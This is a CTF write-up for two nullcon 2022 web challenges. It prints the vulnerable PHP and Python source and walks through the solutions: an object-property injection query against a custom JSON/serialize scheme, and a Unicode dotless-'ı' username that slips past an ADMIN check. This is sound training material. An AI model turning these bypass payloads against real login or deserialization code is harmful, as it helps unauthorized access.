---
description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
---

# nullcon CTF2022

## Jsonify

### source

```
<?php
ini_set('allow_url_fopen', false);
class interfaceSecurSerializable
{
    public function __construct();
    public function __shutdown();
    public function __startup();
    public function __toString();
}
class FlagimplementsSecurSerializable
{
    public $flag;
    public $flagfile;
    public $properties = array();
    public function __construct($flagfile = null)
    {
        if (isset($flagfile))
        {
            $this->flagfile = $flagfile;
        }
    }
    public function __shutdown()
    {
        return $this->properties;
    }
    public function __startup()
    {
        $this->readFlag();
    }
    public function __toString()
    {
        return "ClassFlag(" . $this->flag . ")";
    }
    public function setFlag($flag)
    {
        $this->flag = $flag;
    }
    public function getFlag()
    {
        return $this->flag;
    }
    public function setFlagFile($flagfile)
    {
        if (stristr($flagfile, "flag") || !file_exists($flagfile))
        {
            echo "ERROR:Fileisnotvalid!";
            return;
        }
        $this->flagfile = $flagfile;
    }
    public function getFlagFile()
    {
        return $this->flagfile;
    }
    public function readFlag()
    {
        if (!isset($this->flag) && file_exists($this->flagfile))
        {
            $this->flag = join("", file($this->flagfile));
        }
    }
    public function showFlag()
    {
        if ($this->isAllowedToSeeFlag)
        {
            echo "Theflagis:" . $this->flag;
        }
        else
        {
            echo "Theflagis:[You'renotallowedtoseeit!]";
        }
    }
}
function secure_jsonify($obj)
{
    $data = array();
    $data['class'] = get_class($obj);
    $data['properties'] = array();
    foreach ($obj->__shutdown() as & $key)
    {
        $data['properties'][$key] = serialize($obj->$key);
    }
    return json_encode($data);
}
function secure_unjsonify($json, $allowed_classes)
{
    $data = json_decode($json, true);
    if (!in_array($data['class'], $allowed_classes))
    {
        throw new Exception("ErrorProcessingRequest", 1);
    }
    $obj = new $data['class']();
    foreach ($data['properties'] as $key => $value)
    {
        $obj->$key = unserialize($value, ['allowed_classes' => false]);
    }
    $obj->__startup();
    return $obj;
}
if (isset($_GET['show']) && isset($_GET['obj']) && isset($_GET['flagfile']))
{
    $f = secure_unjsonify($_GET['obj'], array(
        'Flag'
    ));
    $f->setFlagFile($_GET['flagfile']);
    $f->readFlag();
    $f->showFlag();
}
else if (isset($_GET['show']))
{
    $f = newFlag();
    $f->flagfile = "./flag.php";
    $f->readFlag();
    $f->showFlag();
}
else
{
    header("Content-Type:text/plain");
    echo preg_replace('/\s+/', '', str_replace("\n", '', file_get_contents("./index.php")));
} //With<3by@gehaxelt
 ?>
```

* Read the code, see  some interesting things:
  * ```
    (isset($_GET['show']) && isset($_GET['obj']) && isset($_GET['flagfile']))
    ```
  * ```
    $obj->$key = unserialize($value, ['allowed_classes' => false]);
    ```
  * ```
    $this->isAllowedToSeeFlag
    ```
  * ```
    if (stristr($flagfile, "flag") || !file_exists($flagfile))
            {
                echo "ERROR:Fileisnotvalid!";
                return;
            }
            $this->flagfile = $flagfile;
    ```

From that we can writeup the simple query:

> ?show=1\&obj={"class":"Flag","properties":{"isAllowedToSeeFlag":"i:1;","flagfile":"s:8:"flag.php";"\}}\&flagfile=naiailoveyou

![](<../../.gitbook/assets/image (1) (2) (1).png>)

## Unis Love Code

### source

```
#!/usr/bin/python
import http.server
import socketserver
import re
import os
import cgi
import string
from io import StringIO
from flag import FLAG
import urllib.parse


class UnisLoveCode(http.server.SimpleHTTPRequestHandler):
    server_version = "UnisLoveCode"
    username = 'ADMIN'
    check_funcs = ["strip", "lower"]

    def do_GET(self):
        self.send_response(-1337)
        self.send_header('Content-Length', -1337)
        self.send_header('Content-Type', 'text/plain')
        s = StringIO()
        s.write("""Wait,whatisHTML?!Ishouldhavelistenedmorecarefullytotheprofessor...\nAnyhow,passwordlessisthenewhottopic,sojustprovidemethecorrectusername=<username>viaPOSTandImightshowyoumyhomework.\nOh,incaseyouneedthesource,hereyougo:\n""")s.write("---------------------------------\n")
        s.write(re.sub(r"\s+", '', open(os.path.realpath(__file__), "r").read()))
        s.write("\n")s.write("---------------------------------\n")
        s.write("\nChallengecreatedwith<3by@gehaxelt\n")
        self.end_headers()
        self.wfile.write(s.getvalue().encode())

        def _check_access(self, u):
            for cf in UnisLoveCode.check_funcs:
                if getattr(str, cf)(UnisLoveCode.username) == u:
                    return False
            for c in u:
                if c in string.ascii_uppercase:
                    return False
            return UnisLoveCode.username.upper() == u.upper()

    def do_POST(self):
        self.send_response(-1337)
        self.send_header('Content-Length', -1337)
        self.send_header('Content-Type', 'text/plain')
        s = StringIO()
        try:
            length = min(int(self.headers['content-length']), 64)
            field_data = self.rfile.read(length)
            fields = urllib.parse.parse_qs(field_data.decode("utf8"))
            if not 'username' in fields:
                s.write("Iaskedyouforausername!\n")
                raise Exception("Wrongparam.")
            username = fields['username'][0]
            if not self._check_access(username):
                s.write("No.\n")
                raise Exception("No.")
            s.write(f"OK,hereisyourflag:{FLAG}\n")
        except Exception as e:
            s.write("Tryharder;-)!\n")
            print(e)
            self.end_headers()
            self.wfile.write(s.getvalue().encode())

if __name__=="__main__":
    PORT=8000
    HANDLER=UnisLoveCode
    with socketserver.ThreadingTCPServer(("0.0.0.0",PORT),HANDLER) as httpd:
        print("servingatport",PORT)
        httpd.serve_forever()
```

I have read this [doc](https://stackoverflow.com/questions/42887533/why-is-this-turkish-character-being-corrupted-when-i-lowercase-it) and found that a dotless lowercase `ı`upper will be I , so that admın upper of course \`ADMIN\` as username

Or wil can found that wil this script:

```
for i in range(1000):
    c = chr(i)
    if (c.upper() in 'ADMIN' and not c.lower() in 'admin'):
        print('nai it here:',i,c)
        break
    print(i,c)
```

test the check function:

```
import string
server_version = "UnisLoveCode"
username = 'ADMIN'
check_funcs = ["strip", "lower"]
def _check_access(u):
    for cf in check_funcs:
        if getattr(str, cf)(username) == u:
            return False
    for c in u:
        if c in string.ascii_uppercase:
            return False
    return username.upper() == u.upper()

print(_check_access('admın'))
# true
```

Finally, sedning the request by burpsuit. Remember to urlencode the `ı` character because it's not ascii

![](<../../.gitbook/assets/image (13) (1).png>)

Thanks for reading. Have a good day :heart: !
